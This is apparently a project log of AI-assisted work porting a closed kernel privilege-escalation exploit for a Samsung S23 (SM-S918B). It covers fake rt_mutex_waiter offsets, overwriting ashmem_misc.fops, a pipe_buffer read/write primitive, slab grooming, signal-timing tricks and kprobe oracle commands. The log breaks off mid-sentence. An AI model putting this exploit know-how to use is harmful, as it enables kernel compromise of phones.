# Kernel reference material (SM-S918B / S918BXXSAFZH3)

Source: Samsung Open Source Release Center, `SM-S918B_16_Opensource`,
downloaded by the user to `~/Downloads/SM-S918B_16_Opensource/`
(`Kernel.tar.gz`, 611MB; `Platform.tar.gz`, 38MB). Those archives are
**not** copied into this repo (too large, and 99% irrelevant to this
project) -- only the specific subset used for the `rt_mutex`/`rb_erase`
crash investigation is kept here. To pull anything else out of the full
archive:

```sh
tar tzf ~/Downloads/SM-S918B_16_Opensource/Kernel.tar.gz | grep <path>
tar xzf ~/Downloads/SM-S918B_16_Opensource/Kernel.tar.gz <path>
```

Kernel version confirmed matching the live device this session:
`5.15.189-android13-8-33413713-abS918BXXSAFZH3`, chipset `kalama`,
target `dm3q_eur_openx`. `kernel_platform/msm-kernel` and
`kernel_platform/common` ship byte-identical copies of `kernel/locking/`
(diffed, confirmed identical) -- files here are from `msm-kernel`.

## `locking/`

The real kernel source for the `rt_mutex`/`rbtree` primitive the
`app_trigger_fops_slide_route` crash (`rb_erase+0x10` via
`rt_mutex_adjust_pi`, 8/8 reproductions, `src/slide_app.c`) lives inside.
Pulled to move the crash investigation from binary reverse-engineering
(Ghidra/assembly guesswork) to reading the actual compiled logic.

- `rtmutex.c` -- `rt_mutex_adjust_prio_chain()`, `rt_mutex_adjust_pi()`,
  `rt_mutex_enqueue()`/`dequeue()`, `waiter_update_prio()`,
  `rt_mutex_waiter_less/equal()`. The exact function on the crash's call
  stack.
- `rtmutex_common.h` -- `struct rt_mutex_waiter` layout (confirms this
  project's `FAKE_WAITER_*` offsets in `src/targets/.../target.h` are
  byte-correct: `tree_entry@0x00`, `pi_tree_entry@0x18`, `task@0x30`,
  `lock@0x38`, `wake_state@0x40`, `prio@0x44`, `deadline@0x48`,
  `ww_ctx@0x50`).
- `rtmutex.h` -- `struct rt_mutex_base { wait_lock; waiters; owner; }`.
- `rbtree.h`, `rbtree_types.h`, `rbtree_augmented.h` -- `struct rb_node`,
  `RB_EMPTY_NODE`/`RB_CLEAR_NODE`, `__rb_parent_color` bit-packing
  (`RT_MUTEX_HAS_WAITERS = 1`, same bit as rbtree's red/black bit).
- `rtmutex_api.c` -- kept for completeness, not yet needed.

### Finding this session (2026-09-17)

Cross-checked this source against the field values our own
`src/util.c:put_slide_bank_entry()` (open engine, currently crashing)
writes versus what `cve-2026-43499-app-afzh3.so`'s `FUN_00106288` /
`FUN_001061ac` write (decompiled, closed engine, known to work reliably)
for the fake `rt_mutex_waiter` used in the FOPS-install stage:

| field | closed (works) | open engine (crashes) |
|---|---|---|
| corruption target (`ashmem_misc_fops`) | `pi_tree_entry.rb_right` | `pi_tree_entry.rb_left` |
| `task` | real `init_task` | forged `fake_task` |
| `prio` | `0x82` | `0` |
| `lock->owner` | `1` | `0` |

Traced `rt_mutex_owner()` (`rtmutex_common.h:140`,
`RT_MUTEX_HAS_WAITERS=1`) against these values: `1 & ~1 == 0 & ~1 == 0`
-- both `owner` values mask to `NULL` and take the *same* code path.
Confirmed via `pahole -C rt_mutex_base` against
`btf/vmlinux-SAFZH3-5.15.189.btf` that `owner` really is at `+0x18`
(`waiters@+0x08`, size 16) -- no hidden padding surprise. `prio` only
ever participates in plain integer comparisons
(`rt_mutex_waiter_less/equal`) in this path, never a pointer deref.

**Conclusion: the field differences found are real, but this session's
trace could not show them causing different *safe/unsafe* behavior in
`rt_mutex_adjust_prio_chain`.** The crash's fault addresses are
high-entropy garbage (not a plausible kernel pointer, not a
plausibly-mistyped field value either), which points back to this
project's much older "imprecise reclaim" hypothesis: the spray
(`groom.c`'s choreography, ported from `src/util.c:prepare_kernel_page`)
is not reliably landing our object at the exact address
`task->pi_blocked_on` ends up pointing at after the real
`FUTEX_WAIT_REQUEUE_PI` UAF, rather than a wrong-field bug. Next step
belongs there, not in more field-mapping archaeology.

## `closed-payload-decompile/`

`decompiled_afzh3.c` -- full Ghidra headless decompile (148 functions,
6312 lines) of `cve-2026-43499-app-afzh3.so`
(`app/src/main/assets/cve-2026-43499-app-afzh3.so`), produced this
session via:

```sh
/opt/ghidra/support/analyzeHeadless <project_dir> afzh3 \
  -import cve-2026-43499-app-afzh3.so -overwrite
/opt/ghidra/support/analyzeHeadless <project_dir> afzh3 \
  -process cve-2026-43499-app-afzh3.so -noanalysis \
  -scriptPath <dir_with_DecompileAll.java> -postScript DecompileAll.java
```

The `DecompileAll.java` script itself wasn't saved (trivial: iterate
`currentProgram.getFunctionManager().getFunctions(true)`, call
`DecompInterface.decompileFunction`, dump each to a file) -- regenerate
if needed, or ask the assistant to recreate it.

Ghidra address = file offset + `0x100000` (its default ELF load base);
r2/objdump addresses used elsewhere this session = raw file offset, no
bias. `FUN_00106288`+`FUN_001061ac` (mm_struct spray + fake-waiter
builder) and `FUN_0010597c`/`FUN_0010757c` (tracefs KASLR leak) are the
two functions actually ported into `oss-clone-afzh3/` so far
(`src/groom.c`, `src/fops_install.c`, `src/kaslr.c`). Known BOLT
decompiler bug: Ghidra silently drops reachable blocks as "unreachable"
in some functions (confirmed on `FUN_00103e18`/`FUN_00104300` via
r2 `axt` cross-reference) -- always cross-check a suspicious decompile
against raw `r2 -qc "pd N @ <addr>"` disassembly before trusting it.

`kallsyms_safzh3.txt` -- full `/proc/kallsyms` pulled from the live
device this session (`kptr_restrict=0`, rooted), used to verify every
symbol-based offset in `target.h` against ground truth.

## `btf/`

`vmlinux-SAFZH3-5.15.189.btf` -- pulled live from
`/sys/kernel/tracing`... actually `/sys/kernel/btf/vmlinux` on the
physical S918B device this session (`kptr_restrict=0`, rooted). Lets you
run `pahole -F btf -C <struct_name> vmlinux-SAFZH3-5.15.189.btf` for any
struct's real, compiler-computed layout on this exact kernel build
without needing a full kernel rebuild. This is how every `FAKE_*_OFF` /
`FAKE_WAITER_*` constant in `src/targets/dm3q-S918BXXSAFZH3/target.h`
was verified this session.

## `ashmem_misc_fops` is `&ashmem_misc.fops`, not a fops table (2026-09-17)

Real `/proc/kallsyms` (rooted, `kptr_restrict=0`) this session:
`ashmem_fops` (the real, static `file_operations` table) and
`ashmem_misc` (the `struct miscdevice` registered for `/dev/ashmem`) are
TWO SEPARATE symbols. `ASHMEM_MISC_FOPS_OFF` in `target.h` resolves to
`&ashmem_misc + 0x10`, which is exactly `struct miscdevice.fops`'s
offset (confirmed against
`kernel_platform/msm-kernel/include/linux/miscdevice.h`:
`int minor; const char *name; const struct file_operations *fops;` =
4+4pad+8 = 0x10). So "ASHMEM_MISC_FOPS" is the ADDRESS OF THE POINTER
FIELD that `misc_open()` reads to set `file->f_op` on every new
`/dev/ashmem` open -- not a `file_operations` struct to read fields out
of directly.

Traced the real `__rb_erase_augmented()` (`kernel_platform/.../lib/
rbtree.c`, not saved locally, read from the extracted archive) for the
"node has right child, no left child" case -- this project's fake
`rt_mutex_waiter` (`pi_tree_entry = {parent_color=pi_parent, rb_right=
ashmem_misc_fops_addr, rb_left=0}`) matches exactly. That case does
ONE write: `child->__rb_parent_color = node->__rb_parent_color`, i.e.
`*(ashmem_misc_fops_addr) = pi_parent` (`page_base|0x1180`). Nothing
else at that address gets touched (`rb_right`/`rb_left` of the "child"
are NOT written by this rb_erase case, so `ashmem_misc.list` right
after `.fops` in the struct is untouched -- confirmed safe).

Net effect: after the corruption fires, `ashmem_misc->fops` becomes
`page_base + 0x1180`. Every subsequent `/dev/ashmem` open on the WHOLE
SYSTEM (not just our own process) then dereferences THAT address as
the live `file_operations` table. `oss-clone-afzh3/src/fops_install.c`
originally only populated a fake fops table at `page_base+FOPS_OFF
(0x2000)` -- `page_base+0x1180` was left zeroed by the page-wide
`memset`, i.e. a NULL-deref waiting for the next `/dev/ashmem` open by
ANY process. Fixed by writing the identical fake fops table at BOTH
`0x1180` and `0x2000` (`put_fake_fops()` now takes a `table_base`
param). This is believed to be the root cause of the one on-device
crash reproduced this session (probabilistic: only crashes if the
corruption actually lands AND something touches `/dev/ashmem` before
the fake table would have been installed by a fixed version).

## Second, separate AAR/AAW primitive: pipe_buffer spray (not yet ported)

`FUN_001076c0`'s "stage=verifying-kernel-access" self-test uses a
SIMPLE primitive: open a fresh `/dev/ashmem` fd, `pread64`/`pwrite64`
through it (`FUN_00107138`/`FUN_00107058`, confirmed via raw r2 disasm
-- thin `__pread_chk`/`__pwrite_chk` wrappers, signature `(fd,
target_kernel_addr, buf, len)`). Ported verbatim as
`oss-clone-afzh3/src/aar_aaw.c`. **Never yet proven to reach real
kernel memory on-device** -- every read attempt so far (9 real device
runs) returned `EINVAL`, which is normal/expected ashmem behavior for
an uncorrupted fd (ashmem requires `ioctl(ASHMEM_SET_SIZE)` before
reads are valid), not a distinguishable "primitive is live but empty"
signal.

The LATER "stage=starting-temporary-root" step
(`FUN_00108808`/`FUN_00108fa4`, called from `FUN_001076c0`'s retry
loop) uses a COMPLETELY DIFFERENT, much larger primitive:

- `FUN_00108604` (raw disasm, NOT Ghidra -- decompile of this one is
  reliable, but its callers are BOLT-scrambled) builds a fake
  `struct pipe_buffer` (BTF-confirmed 40 bytes = `0x28`: `page@0,
  offset@8, len@12, ops@16, flags@24, private@32`) with `page` computed
  via the classic `vmemmap` page-index formula (`VMEMMAP_START +
  ((addr + DIRECT_MAP_BASE) >> 12) * STRUCT_PAGE_SIZE` -- every
  constant here matches `target.h` exactly) and `ops = ANON_PIPE_BUF_OPS`
  (real kernel address, also an existing `target.h` constant). Sprays
  this 40-byte object 16 times at `0x800`-byte strides via
  `FUN_00107058` (the SAME generic pwrite64-style wrapper, but against
  a DIFFERENT fd here -- a pipe fd, not the ashmem fd).
- `FUN_001086e0`/`FUN_00108774` are the read/write "verified" wrappers
  around this (bounds-check `offset+len <= 0x1000`, then either reuse
  an already-established fast path or call `FUN_00108604` to
  (re)establish it, then `__read_chk`/`__write_chk` to confirm).
- `FUN_00107dd4` (1356 bytes, mostly legible) is a SEPARATE grooming
  routine for this primitive's target allocation, and reuses THE EXACT
  SAME 4-tier scratch globals as `FUN_00106288`/`groom.c`
  (`DAT_0010d9d8`=1024, `DAT_0010d9f0`=192, `DAT_0010da08`=31,
  `DAT_0010da20`=32 -- confirmed via `FUN_001060e8`'s cleanup call
  listing all four) -- i.e. this is groom.c's own generic n-tier
  slab-spray choreography, reused for a pipe_buffer-array-sized
  allocation instead of `mm_struct`, not a separate technique.
  `FUN_00107d18`/`FUN_00107d50` set up the actual pipes:
  `FUN_00107ce8(fd, pages) = fcntl(fd, F_SETPIPE_SZ=0x407, pages<<12)`
  (raw disasm, clean) -- `FUN_00107d18` uses 2 pages (8192 bytes,
  `bufs` alloc = 2*40=80 bytes), `FUN_00107d50` uses 32 pages (131072
  bytes, `bufs` alloc = 32*40=1280 bytes). Which tier targets which
  pipe size, and the exact fork/sendmsg(SCM_RIGHTS)/close choreography
  connecting `FUN_00107dd4` to `FUN_00108604`'s spray, was NOT fully
  resolved this session -- `FUN_00107dd4`'s decompiled pointer-alias
  tracking (`local_90`/`local_a8`/`local_c0`/`local_d8` etc.) is shaky
  even where Ghidra didn't outright give up, and a cluster of its
  callees (`FUN_00108eec` through `FUN_00108f98`) are BOLT-fragmented
  shared trampoline code with NO clean function boundaries -- multiple
  call sites jump into the MIDDLE of what Ghidra/r2 each guessed were
  separate functions, sharing live register state (x19/x20/x21/x9)
  across supposed "function" boundaries with no gaps between them.
  Fully resolving this needs manual CFG reconstruction across
  `FUN_001086e0`+`FUN_00108774`+`FUN_00108808` together (they share the
  fragment cluster), not incremental single-function decompilation --
  flagged as a large, distinct remaining task rather than guessed at.

Individually confirmed helper functions (all clean decompile, no BOLT
damage, no further work needed on these -- listed so a future session
doesn't have to re-derive them):

- `FUN_00105ef0` = fork() + `PR_SET_PDEATHSIG` + `pause()` loop forever
  (parent-death-checked idle child). Byte-for-byte the same pattern as
  this project's own `groom.c:clone_child()` (which uses raw
  `clone(SIGCHLD,...)` instead of `fork()` -- equivalent).
- `FUN_00105f40` = same fork+PDEATHSIG, but the child calls
  `FUN_00104c64(DAT_0010d998)` then `exit(0)` instead of pausing --
  matches `groom.c:clone_leak_child()`'s shape
  (`kernelsnitch_find_collisions()` then `exit(0)`) exactly;
  `FUN_00104c64` not yet independently confirmed to BE
  kernelsnitch's collision-finder, but the pattern match is exact.
- `FUN_00105f94(pid)` = `snprintf("/proc/%d/mem", pid)` +
  `__open_2(path, O_RDONLY)` -- matches `groom.c:open_memfd()` exactly.
- `FUN_00106008(pid)` = `kill(pid,9); waitpid(pid,NULL,0);` -- matches
  `groom.c:kill_child()` exactly.
- `FUN_00106178()` = `pid=FUN_00105ef0(); fd=FUN_00105f94(pid);
  FUN_00106008(pid); return fd;` -- a SINGLE-SHOT fork+open+kill
  (not batched like `groom.c`'s own choreography). This is what fills
  each element of `FUN_00107dd4`'s 4 tier arrays, one child at a time,
  rather than forking all N first. Whether this sequential variant
  still achieves reliable grooming (vs `groom.c`'s batched
  fork-all/open-all/kill-in-order technique, which IS proven on
  device) is unresolved -- worth testing empirically rather than
  assuming either way before porting further.

### `FUN_00108808` deep trace (2026-09-17, raw r2 disasm, ~75% covered)

Traced roughly 350 of 423 instructions by hand (`r2 -qc "pd N @ 0x8808"`,
raw vaddr, not Ghidra's `+0x100000`-biased address). Confirmed shape:

1. Sanity-checks an already-established base pointer (`DAT_..ae0`) is a
   real direct-mapped kernel address (`x8>>36==0xFFFFFF8`, i.e. same
   `is_direct_ptr()` check as `src/root.c`).
2. `pread64`s a 448-byte (`0x1c0`) struct from a computed dynamic
   kernel address into a stack buffer (target not fully identified --
   likely a `workqueue_struct`/`pool_workqueue` dump, given the caller
   is the "starting-temporary-root" stage, but not confirmed).
3. **Slab identification via direct `struct page` reads** (NOT
   kernelsnitch/timing): walks 8 consecutive physical pages (order-3,
   `0x8000` bytes -- same order this project's `groom.c` already uses),
   for each resolves the real `struct page` address (`VMEMMAP_START +
   ((phys_addr + DIRECT_MAP_BASE) >> 12) * STRUCT_PAGE_SIZE`, every
   constant matching `target.h` exactly), follows `compound_head` if
   it's a tail page (`STRUCT_PAGE_COMPOUND_HEAD_OFF`), then reads
   `page->slab_cache` (`STRUCT_SLAB_CACHE_OFF`) and compares it against
   two candidate kmalloc-cache pointers passed in via the function's
   own 2nd argument. This is the closed binary's OWN direct
   ground-truth alternative to the timing-based kernelsnitch technique
   -- only usable once SOME arbitrary-read primitive already exists,
   which is exactly the phase this function runs in.
4. On a cache match: scans the 448-byte buffer from step 2 in 8-byte
   strides looking for a real `struct pipe_buffer`-shaped record
   (40 bytes: page/offset+len/ops/flags/private) whose `.ops` field
   equals the real `anon_pipe_buf_ops` kernel address (same delta-
   encoding pattern as `FUN_00108604`), with `flags==0x10` and
   `private==0` and a plausible `len` (1..240). This finds the EXACT
   buffer-array slot to target, rather than blindly spraying.
5. Past that: several consistency re-checks against more `DAT_..`
   globals (bookkeeping counters from the page-scan), then builds and
   writes what are almost certainly configfs-style attribute-name
   strings (`"nebusec_70687973727730"`, `"...31"` -- not yet decoded;
   could be XOR/rot-obfuscated or literal configfs group/attr names,
   not resolved this session) via `FUN_00108f30` (itself another
   BOLT-fragmented stub, not decoded), then calls `FUN_001086e0`
   (confirmed earlier: the "verified read" wrapper around the
   established primitive) and `FUN_00108774` ("verified write")
   to actually exercise the found slot.

**Not finished**: the remaining ~70 instructions of `FUN_00108808`
(from roughly raw vaddr `0x8d98` to its end at `0x8ea4`), and all of
`FUN_00108fa4` (1524 bytes, not started). Given the size and BOLT
fragmentation already encountered, treat this as a distinct, large
follow-up task -- do NOT guess at the remainder from partial context.

## Decisive finding: corruption does not land on `ashmem_misc.fops` in 6/6 traced runs (2026-09-17)

Built an INDEPENDENT oracle to settle whether `groom.c`+`futex_trigger.c`'s
`rb_erase`/`sched_setattr` trigger actually writes into real kernel
memory, without depending on this project's own (unproven) AAR/AAW
primitive: a kprobe with an absolute-address fetch, which reads a fixed
kernel address directly, bypassing the exploit chain entirely.

```sh
echo "p:oracle __arm64_sys_gettid val=@0xffffffc00adecf28:u64" \
  > /sys/kernel/tracing/kprobe_events   # 0xffffffc00adecf28 = THIS boot's
                                        # ashmem_misc.fops address
echo 1 > /sys/kernel/tracing/events/kprobes/oracle/enable
echo 1 > /sys/kernel/tracing/tracing_on
# fire the exploit, then trigger the probe (any gettid() call, e.g.
# `cat /proc/self/stat`), then read /sys/kernel/tracing/trace
```

Baseline (before firing anything): `val=0xffffffc00a1fd4b8`, which
equals `kernel_base + ASHMEM_FOPS_OFF` exactly -- confirms the oracle
reads the correct live address and that `ashmem_misc.fops` correctly
points at the real `ashmem_fops` table at rest.

Fired `test_futex_trigger_v2` (the already-proven `groom.c` +
`futex_trigger.c` chain, `sched_setattr ret=0` every time, no crash)
**6 times**, reading the oracle immediately after each one. All 6
reads returned the SAME baseline value, completely unchanged. The
corruption is NOT reaching `ashmem_misc.fops` in ANY of these 6 runs,
despite `sched_setattr` reporting success every time.

**This means `rt_mutex_adjust_pi()`/`rb_erase()` firing without error
does not imply it operated on THIS project's fake waiter at all** --
most likely `task->pi_blocked_on` is not reliably ending up pointed at
the fake waiter after the `FUTEX_WAIT_REQUEUE_PI`/`FUTEX_CMP_REQUEUE_PI`
dance, i.e. the real UAF reclaim precision (this project's
long-standing "imprecise reclaim" hypothesis, see the field-mapping
section above) is the primary open problem -- not the field values
(triple-verified correct against the closed binary) and not the
`ashmem_misc.fops`-zeroed-region NULL-deref (real bug, correctly fixed,
but apparently rarely if ever the ACTIVE mechanism, since corruption
essentially never lands per this evidence). The one crash reproduced
earlier this session likely reflects a genuinely rare case where
reclaim timing lined up differently (target uncontrolled), not routine
operation of the intended primitive.

**Next investigative step, not yet done**: instrument (via the same
kprobe-oracle technique, or a kprobe on `rt_mutex_adjust_prio_chain`
itself with register dumps) exactly what `task->pi_blocked_on` and the
waiter chain look like at the moment `sched_setattr` triggers the
adjust-prio-chain walk, to see whether the fake waiter is in the chain
at all, or whether the real kernel thread's UAF'd `rt_mutex_waiter` is
landing somewhere else / already reclaimed by something other than our
spray by the time it's dereferenced.

## Root cause pinned down: `task->pi_blocked_on` never points at our fake waiter (2026-09-17)

Followed the previous finding's own "next step" suggestion: kprobe'd
`rt_mutex_adjust_prio_chain` itself (the real function, static symbol,
still resolvable via kallsyms) with register+offset fetches, reading
the actual arguments AND `task->pi_blocked_on` at the exact moment the
chain walk starts:

```sh
echo "p:probe2 rt_mutex_adjust_prio_chain task=%x0 waiter=%x4 \
  pi_blocked_on=+0x8b0(%x0):u64 waiter_task=+0x30(%x4):u64" \
  > /sys/kernel/tracing/kprobe_events
```//x0=task, x4=orig_waiter per the real signature (confirmed against
`locking/rtmutex.c:616`); `+0x8b0`=`FAKE_TASK_PI_BLOCKED_ON_OFF`,
`+0x30`=`FAKE_WAITER_TASK_OFF`, both already-verified `target.h`
offsets.

Fired `test_futex_trigger_v2` once with this armed, tracing_on only for
the duration of that single run. Captured exactly 3 hits, all from our
own process. The relevant one:
`task=0xffffff88b29f2400 waiter=0xffffffc03ef9bb48
pi_blocked_on=0xffffffc031d4bb38`.

**`task->pi_blocked_on` (`0xffffffc031d4bb38`) is a real kernel address
in a completely different range from that run's `payload_base`
(`ffffff88b7237000`, direct-mapped/reclaimed-slab range) -- it is NOT
pointing at our sprayed fake waiter.** `sched_setattr` still reports
`ret=0` and the chain walk still runs (on a real, unrelated waiter),
which is exactly why every test so far has reported "success" and "no
crash" without the corruption ever actually landing.

**Conclusion, now backed by direct kernel-side evidence instead of
inference**: the primitive that has been treated as "proven" all
session (`groom.c`'s reclaim + `futex_trigger.c`'s
`FUTEX_WAIT_REQUEUE_PI`/`FUTEX_CMP_REQUEUE_PI` dance) reliably
completes its OWN steps without error, but does not reliably achieve
the actual UAF precondition -- getting the real kernel thread's
`task->pi_blocked_on` to point into our reclaimed-and-sprayed page.
Every downstream layer built this session (`fops_install.c`'s field
content, `aar_aaw.c`, `root_umh.c`, the whole pipe_buffer subsystem
mapped above) is contingent on this precondition and cannot be
meaningfully tested until it holds. This is now the single highest-
priority open problem, above any further function-by-function porting
of the closed binary's later stages.

**Not yet investigated**: why the reclaim doesn't land here specifically
-- candidates include wrong target rt_mutex_waiter size/cache class for
THIS kernel build (never independently verified against `/proc/slabinfo`
or BTF the way `mm_struct`'s 0x400 size was), wrong timing window
(spray happens before/after the real waiter is actually freed), or the
`FUTEX_WAIT_REQUEUE_PI` timeout (`WAIT_NSEC=50000000`, 50ms) racing
against `groom.c`'s own completion instead of being sequenced strictly
after it settles.

## Major reframing: the real trigger is a self-directed SIGUSR1, not just the userspace deadlock dance (2026-09-17)

Per direct instruction to re-check the closed binary's real waiter
thread (`FUN_00103e18`, raw vaddr `0x3e18`) against kernel source,
traced the FULL function (984 bytes) from scratch via raw r2 disasm.
It does far more than `futex_trigger.c`'s `waiter_thread_fn`:

1. `sigaction(SIGUSR1, handler=0x3d6c, SA_SIGINFO|SA_RESTART)`
   (`0x10000004` flags) BEFORE any futex call.
2. The usual `FUTEX_LOCK_PI`(`f_pi_chain`)-equivalent setup (via an
   unresolved helper, `fcn.000041f0` -- looks like `rt_sigprocmask`
   given it builds a `1<<signum` mask, not yet fully confirmed) and a
   ready-flag spin-wait (`usleep`-based, matches this project's
   `waiter_ready`/`owner_started` sync).
3. `clock_gettime` + `syscall(FUTEX_WAIT_REQUEUE_PI=0xb, ...)` --
   matches `futex_trigger.c` exactly here.
4. After the syscall returns: a SECOND, much tighter spin-wait using
   `mrs x11, cntvct_el0` (the ARM64 virtual cycle counter) with a
   bounded iteration count (~0x3b9a3b ≈ 3.9M `yield`-spins) -- a
   PRECISION busy-wait, not a coarse `usleep`.
5. Builds a 0x200-byte (512-byte) structure in a shared buffer
   (`adr x23/x8, 0xd72c`, offset `+0x4c`) using the SAME
   `FUN_00105e18`/`FUN_00104edc`-style `put64`/zero helpers already
   confirmed elsewhere this session -- this is another fake
   `rt_mutex_waiter`-shaped payload, independent of the one
   `fops_install.c` already ports.
6. `getpid()` + `syscall(gettid)` + **`syscall(__NR_tgkill=0x83, pid,
   tid, SIGUSR1)`** -- sends itself SIGUSR1, i.e. deliberately
   interrupts its own (already-returned, or about to be re-entered?)
   futex flow with a signal, precisely timed by the cycle-counter spin
   from step 4.
7. Waits (short spin, `<0x3b9a3fxx` cycles again) for a flag, then --
   only if a counter is `>=1` -- calls `FUN_001076c0` (the
   "verifying-kernel-access" function, already partly ported into
   `aar_aaw.c`) DIRECTLY from the waiter thread.

The SIGUSR1 handler itself (`0x3d6c`, separate function, NOT the
unrelated atomic-swap helper `fcn.00003d40` that merely precedes it in
the binary with no gap): scans its own `ucontext->uc_mcontext.__reserved`
for a `_aarch64_ctx` record with `magic=0x46508001` (`FPSIMD_MAGIC`,
confirmed against `arch/arm64/kernel/signal.c:183`) and
`size=0x210` (`sizeof(struct fpsimd_context)`, confirmed same file).
Once found, copies 0x200 bytes from the SAME `0xd72c+0x4c` buffer
step 5 built into the FPSIMD context's register area (past its 16-byte
header) -- i.e. **overwrites its own pending signal frame's saved
Q0-Q31 register values with the pre-built fake-waiter-shaped payload**,
which will be restored into real CPU registers on `sigreturn()`.

Checked `arch/arm64/kernel/signal.c`'s real `parse_user_sigframe()`/
`restore_fpsimd_context()` (lines 190-420) -- both are properly
bounds-checked (`size != sizeof(struct fpsimd_context)` rejected
outright, `EXTRA_MAGIC` sub-parsing also bounds-checked). **No obvious
sigframe-parsing buffer overflow here** -- this looks like real,
hardened kernel code, not a naively-missing check. So the FPSIMD
content is most likely NOT a memory-corruption payload in itself, but
a way to stash the pre-built fake-waiter bytes somewhere that survives
across the signal-interrupt boundary for retrieval elsewhere (SVC
register state after `sigreturn` restores it) -- not yet confirmed
where it gets read back from.

Checked `kernel/futex/core.c`'s requeue-vs-early-wakeup synchronization
(`Q_REQUEUE_PI_NONE/IGNORE/IN_PROGRESS/WAIT/DONE/LOCKED` state machine,
`futex_requeue_pi_wakeup_sync()`, lines ~245-290, ~1870-1900) --
this is a deliberately hardened `atomic_t`-based protocol that already
exists specifically to prevent naive early-wakeup-vs-requeue races.
**If CVE-2026-43499 is a futex-PI UAF, it must be a genuine, subtle
bug WITHIN or around this state machine**, not a simple missing check
-- consistent with why the closed binary needs cycle-counter-precision
timing (`cntvct_el0` spin, not just `usleep`) to hit it reliably, and
why this project's coarser userspace deadlock-timeout dance
(`futex_trigger.c`, no signal involved at all) essentially never lands
the corruption (matches the kprobe evidence above exactly: `sched_setattr`
"succeeds" because it's operating on whatever REAL, unrelated waiter
chain exists, never on a UAF'd one).

**This was investigation only, per explicit instruction to keep the
device stable -- nothing was rebuilt, pushed, or fired this round.**
`futex_trigger.c` is fundamentally missing this entire signal-based
mechanism (points 1, 4, 5, 6 above) and cannot be fixed by a small
patch; it needs the SIGUSR1 handler + precision-timed self-signal
ported as a new, substantial piece, with the exact race window
(what specifically happens in the kernel between the `tgkill` and the
`sched_setattr` later on) still unresolved. Do not attempt this on a
device without a full understanding of the timing requirement --
getting a kernel race window wrong is more likely to produce
unpredictable corruption than the current safe-but-ineffective
behavior.

## Further trace of `FUN_00103e18`: CPU pinning + call-site ordering (2026-09-17)

Decoded the two helpers used throughout the waiter thread:

- `fcn.000041f0(cpu)` = `sched_setaffinity(0, 0x80, &(1<<cpu))` --
  pins the CALLING THREAD to one specific CPU. Waiter thread calls this
  with `w0=3` as its very first action (pin to CPU 3). `futex_trigger.c`
  does no CPU pinning at all currently -- missing piece.
- `fcn.00004918(x)` is trivial: zeroes x2-x5, leaves x0/x1 alone, `ret`
  -- just clears unused syscall args before `bl syscall`. Not a
  syscall-number resolver (revises an earlier guess); irrelevant to
  the exploit logic itself.

**Precise event ordering confirmed** (corrects an earlier guess that
the signal interrupts the blocking futex call): `tgkill(SIGUSR1)`
fires AFTER `FUTEX_WAIT_REQUEUE_PI` has already returned (its
zero-out/cleanup code at raw vaddr `0x3f30-0x3f68` runs first). So the
signal is not used to interrupt the blocking syscall mid-flight --
it's sent once the wait has already resolved (presumably `ETIMEDOUT`,
same as `futex_trigger.c`'s existing design).

**Structurally significant**: immediately after the `tgkill` and its
own short `cntvct_el0` spin-wait, if a counter is `>=1`, the WAITER
THREAD ITSELF calls `FUN_001076c0` ("stage=verifying-kernel-access")
directly (raw vaddr `0x4150`, `bl fcn.000076c0`) -- NOT `main()`, and
NOT after any `sched_setattr`/owner-thread coordination step. This
project's `test_root.c`/`root_umh.c` call `oss_verify_kernel_access`
from a completely different place (after `run_futex_trigger()` fully
returns, from `main`), much later and from the wrong thread/context.
This alone could explain every `EINVAL`/mismatch seen in on-device
testing so far, independent of whether the deeper signal-frame
mechanism is understood -- worth fixing and re-testing before chasing
the FPSIMD/sigreturn mechanism further.

FPSIMD-payload purpose still not conclusively determined. The
signal handler does nothing besides locate the FPSIMD context record
and `memcpy` the pre-built 512-byte buffer into it, then return
(`mov w0,1; ret`) -- no other kernel-facing call happens inside the
handler itself. Two live hypotheses, neither confirmed: (a) it's
cross-signal-boundary userspace scratch storage for data later reused
by `FUN_001076c0`/`sched_setattr`, unrelated to memory corruption
directly; (b) it interacts with `fpsimd_thread_switch()`-managed
per-thread FPSIMD state in a way that lands the payload somewhere
`groom.c`'s reclaim later picks up. Real
`arch/arm64/kernel/signal.c` parsing itself is properly bounds-checked
(confirmed above) so a naive parsing-overflow theory is unlikely.

Stopping the raw-disassembly line of investigation here for this
round -- diminishing returns without being able to test hypotheses on
device, and further guessing at the FPSIMD mechanism's exact role
risks exactly the kind of invented, unverified conclusion this
project's standing rule prohibits. The CPU-pinning and call-ordering
findings above are concrete and actionable; the FPSIMD mechanism is
not, yet.

## Two safe experimental fixes tried, both negative (2026-09-17)

Per continued investigation, found and ported two more concrete,
low-risk pieces from `FUN_00103e18`/`FUN_00104300` (both cleanly
decompiled, no BOLT damage):

1. **CPU pinning**: `sched_setaffinity(0, 0x80, {1<<3})` -- the
   closed binary's waiter thread pins itself to CPU 3 before doing
   anything else. Ported to `futex_trigger.c:waiter_thread_fn` as
   `pin_to_cpu(3)`.
2. **Cycle-precise pre-trigger delay**: `FUN_00104300` (the real
   consumer/trigger function) reads `getenv("S23_SUPERVISOR_ATTEMPT")`
   to index this project's already-known 8-entry delay table
   (`{5000, 0, 10000, 30000, -5000, 20000, 15000, 25000}`, already
   present in `src/main.c` for an unrelated millisecond-scale purpose)
   and busy-waits that many RAW CPU CYCLES (`mrs cntvct_el0`, tight
   yield-loop, not `usleep`) immediately before calling
   `sched_setattr`. `futex_trigger.c` had no delay at all here before
   this fix. Ported as `spin_wait_cycles(5000)` (default index-0
   value) right before `sched_setattr_tid()`.

Also tried a tight-retry (200x, no sleep) loop around
`oss_verify_kernel_access()` in `root_umh.c`, to test whether the
verification just needed to be attempted sooner/more aggressively
after the trigger (motivated by the finding that the closed binary
calls its verify step from inside the same thread, immediately).

**Tested all three together on-device using the same independent
kprobe oracle from before** (`@0xffffffc00adecf28` on
`__arm64_sys_gettid`, bypassing this project's own AAR/AAW primitive
entirely). Result: **`ashmem_misc.fops` still reads the unchanged
baseline value** (`0xffffffc00a1fd4b8`) after firing. No crash, device
stable, boot continuous throughout. All three fixes are real, kept in
the tree, but **none of them individually or together caused the
corruption to land**.

**Conclusion**: the missing piece is very likely the SIGUSR1
self-signal + FPSIMD-context-rewrite mechanism itself (see the
"Major reframing" section above), not fine-tuning around it -- CPU
affinity and pre-trigger cycle delay were plausible-looking
timing/scheduling details but evidently not sufficient on their own.
The FPSIMD mechanism's exact purpose remains the real open question
and the most likely next lead, even though it could not be safely
guessed at and ported this round.

## `FUN_00107dd4` fully re-traced with corrected methodology (2026-09-17, unattended session)

Earlier passes at this function (see "Confirmed: FUN_00107dd4..." above)
used Ghidra's decompile, which suffers from misleading pointer-alias
naming in this specific function (confirmed: r2's default variable
